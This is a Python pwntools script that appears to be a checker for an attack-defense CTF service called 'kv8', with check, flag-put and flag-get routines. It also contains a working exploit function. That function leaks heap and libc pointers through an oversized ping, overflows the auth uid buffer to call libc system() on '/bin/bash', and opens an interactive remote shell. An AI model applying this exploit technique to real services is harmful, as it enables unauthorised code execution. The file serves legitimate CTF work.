#!/usr/bin/env python
import sys

import enum

PORT = 4242

argvv = [] + sys.argv
from pwn import *



def cmd_ping(io, leak=0):
    CMD_PING = 4
    ping = "ping" + "\x00" + "\x00" * leak
    header1 = struct.pack("L", CMD_PING) + struct.pack("L", len(ping) + 1)
    packet1 = header1 + ping + "\x00"
    io.send(packet1)
    respheader = struct.unpack("LL", io.recvn(16))
    l = respheader[1]
    return io.recvn(l)


def cmd_auth(io, struid):
    CMD = 0
    l = len(struid)
    if l > 0xff:
        raise Exception("l > 0xff")
    body = struct.pack("B", l) + struid
    header1 = struct.pack("L", CMD) + struct.pack("L", len(body))
    packet = header1 + body
    io.send(packet)
    res = struct.unpack("LL", io.recvn(16))
    # print "auth res ", res
    return res


def cmd_put(io, k, v):
    CMD = 2
    body = struct.pack("BB", len(k), len(v)) + k + v
    header1 = struct.pack("L", CMD) + struct.pack("L", len(body))
    packet = header1 + body
    io.send(packet)
    res = struct.unpack("LL", io.recvn(16))
    return res


def cmd_get(io, k):
    CMD = 3
    body = k
    header1 = struct.pack("L", CMD) + struct.pack("L", len(body))
    packet = header1 + body
    io.send(packet)
    res = struct.unpack("LL", io.recvn(16))
    if res[0] == 200:
        l = res[1]
        return io.recvn(l)
    else:
        return None



def cmd_quit(io):
    CMD_QUIT = 5
    header1 = struct.pack("L", CMD_QUIT) + struct.pack("L", 0)
    packet = header1
    # open("auth")
    io.send(packet)
    recv = io.recvn(16)
    # print "reading header", hexdump(recv)
    res = struct.unpack("LL", recv)
    # print "quit res ", res
    l = res[1]
    if l != 0:
        goodby = io.recvn(l)
    else:
        goodby = None
    # print "goodby", goodby
    return [res[0], res[1], goodby]


# def put("")


def exploit(host):
    io = connect(host)
    # exe = ELF("./kv8")
    libc = ELF("./libc.so.6")
    # libc = ELF("./ld-musl-x86_64.so.1")
    # ld-musl-x86_64.so.1
    ctx_uid_diff = 0x55612d9b42b0 - 0x55612d9b4260
    # malloc 0 0x55612d9b4260
    # malloc 1 0x55612d9b42b0
    leak1 = cmd_ping(io, leak=512)
    root_ctx_ptr = struct.unpack("L", leak1[16 * 4 + 2:16 * 4 + 2 + 8])[0]
    exit_ptr = struct.unpack("L", leak1[16 * 3 + 10:16 * 3 + 10 + 8])[0]
    uid_ptr = root_ctx_ptr + ctx_uid_diff
    print "root_ctx_ptr", hex(root_ctx_ptr)
    print "uid_ptr", hex(uid_ptr)
    print "exit_ptr", hex(exit_ptr)
    libc.address = exit_ptr - libc.sym.exit
    print "libc base addr", hex(libc.address)
    print "continue"
    sys.stdin.readline()
    padding = cyclic(256)
    print "padding", padding
    padding = padding[:padding.find("ablaabma")]
    rdi = struct.pack("L", uid_ptr)
    rip = struct.pack("L", libc.sym.system)
    padding += rdi + rip + 'e' * 100
    # RAX  0x616f6261616e6261 ('abnaaboa')
    # RDI  0x616d6261616c6261 ('ablaabma')
    # call rax
    uid = '/bin/bash\x00' + padding
    uid = uid[:255]
    cmd_auth(io, uid)
    leak2 = cmd_ping(io, leak=512)
    # print 'leak', hexdump(leak)
    cmd_quit(io)
    io.interactive()


STATUS_OK      = 101
STATUS_CORRUPT = 102
STATUS_MUMBLE  = 103
STATUS_DOWN    = 104
STATUS_ERROR   = 110

def quit(code, message=None):
    # print "quiting", code, message
    if message is not None and code != STATUS_OK:
        print message
    # assert(type(code) == Status)
    sys.exit(code)

def connect(host):
    try:
        if args.LOCAL:
            return process("./kv8")
        else:
            io = remote(host, PORT, level=60)
            return io
    except:
        quit(STATUS_DOWN, "connection failed")



def randomid():
    return "".join([random.choice(string.ascii_lowercase) for i in range(10)])


def check(host):


    uid = randomid()
    k = randomid()
    v = randomid()

    with connect(host) as io:

        try:
            res = cmd_auth(io, uid)
            if res[0] != 200 or res[1] != 0:
                quit(STATUS_MUMBLE, 'auth failed')
        except Exception as e:
            quit(STATUS_MUMBLE, "check auth failed with exception " + str(type(e)))
        try:
            remote_value = cmd_get(io, k)
            if remote_value is not None:
                quit(STATUS_MUMBLE, 'could read value before it was put')
        except Exception as e:
            quit(STATUS_MUMBLE, "check get 1 exception " + str(type(e)))

    with connect(host) as io:
        try:
            res = cmd_auth(io, uid)
            if res[0] != 200 or res[1] != 0:
                quit(STATUS_MUMBLE, 'auth failed')
        except Exception as e:
            quit(STATUS_MUMBLE, "check auth failed with exception " + str(type(e)))
        try:
            res = cmd_put(io, k, v)
            if res[0] != 200 or res[1] != 0:
                quit(STATUS_MUMBLE, 'check-put failed')
        except Exception as e:
            quit(STATUS_MUMBLE, "check put failed with exception " + str(type(e)))

    with connect(host) as io:
        try:
            res = cmd_auth(io, uid)
            if res[0] != 200 or res[1] != 0:
                quit(STATUS_MUMBLE, 'auth failed')
        except Exception as e:
            quit(STATUS_MUMBLE, "check auth failed with exception " + str(type(e)))

        try:
            remote_value = cmd_get(io, k)
            if remote_value is None:
                quit(STATUS_MUMBLE, 'could not read value after put')
        except Exception as e:
            quit(STATUS_MUMBLE, "check get2  failed with exception " + str(type(e)))

    with connect(host) as io:
        try:
            res = cmd_auth(io, uid)
            if res[0] != 200 or res[1] != 0:
                quit(STATUS_MUMBLE, 'auth failed')
        except Exception as e:
            quit(STATUS_MUMBLE, "check auth failed with exception " + str(type(e)))
        try:
            res = cmd_ping(io)
            if "ping pong kv8 version 4242" not in res:
                quit(STATUS_MUMBLE, 'ping pong failed')
        except Exception as e:
            quit(STATUS_MUMBLE, "ping pong failed with exception " + str(type(e)))

        try:
            res = cmd_quit(io)
            # print res
            if res[0] != 200 or res[1] == 0 or "goodby" not in res[2]:
                quit(STATUS_MUMBLE, 'check-quit failed')
        except Exception as e:
            quit(STATUS_MUMBLE, "quit failed with exception " + str(type(e)))

    quit(STATUS_OK)



def flag_put(host, id, flag):
    with connect(host) as io:

        try:
            res = cmd_auth(io, id)
            if res[0] != 200 or res[1] != 0:
                quit(STATUS_MUMBLE, 'put auth failed')

            res = cmd_put(io, "flag", flag)
            if res[0] != 200 or res[1] != 0:
                quit(STATUS_MUMBLE, 'put failed')
        except Exception as e:
            quit(STATUS_MUMBLE, "exception " + str(type(e)))

    with connect(host) as io:
        try:
            res = cmd_auth(io, id)
            if res[0] != 200 or res[1] != 0:
                quit(STATUS_MUMBLE, 'put auth2 failed')

            remote_value = cmd_get(io, "flag")
            if remote_value is None or remote_value != flag:
                quit(STATUS_MUMBLE, 'could not read flag after put')
            io.close()
        except Exception as e:
            quit(STATUS_MUMBLE, "exception " + str(type(e)))

    quit(STATUS_OK)


def flag_get(host, id, flag):
    with connect(host) as io:
        try:
            res = cmd_auth(io, id)
            if res[0] != 200 or res[1] != 0:
                quit(STATUS_MUMBLE, 'get auth2 failed')

            remote_value = cmd_get(io, "flag")
            if remote_value is None or remote_value != flag:
                quit(STATUS_MUMBLE, 'could not read flag ')
            io.close()
        except Exception as e:
            quit(STATUS_MUMBLE, "exception " + str(type(e)))
        quit(STATUS_OK)


def main():
    # ./checker.py info
    # ./checker.py check 6.6.10.2
    # ./checker.py put 6.6.10.2 qweq-qweq-qweq ABCDEF1234567890ABCDEF123456789= 1
    # ./checker.py get 6.6.10.2 qweq-qweq-qweq ABCDEF1234567890ABCDEF123456789= 1

    action = argvv[1]
    if action == 'exploit':
        exploit(argvv[2])
    elif  action == 'info':
        quit(STATUS_OK)
    else:
        host = argvv[2]
        if action == 'check':
            check(host)
        else:
            id = argvv[3]
            flag = argvv[4]
            if action == 'put':
                flag_put(host, id, flag)
            elif action == 'get':
                flag_get(host, id, flag)


if __name__ == "__main__":
    main()
